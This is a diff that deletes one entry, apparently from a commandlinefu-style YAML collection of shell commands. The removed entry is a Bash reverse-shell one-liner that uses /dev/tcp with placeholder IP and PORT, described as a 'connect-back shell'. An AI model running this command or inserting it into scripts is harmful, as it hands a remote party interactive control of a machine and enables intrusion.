@@ -1,8 +1,0 @@
-commandlinefu_id: 7907
-translator:
-  weibo: ''
-hide: true
-command: |-
-  bash -i >& /dev/tcp/IP/PORT 0>&1
-summary: |-
-  Connect-back shell using Bash built-ins
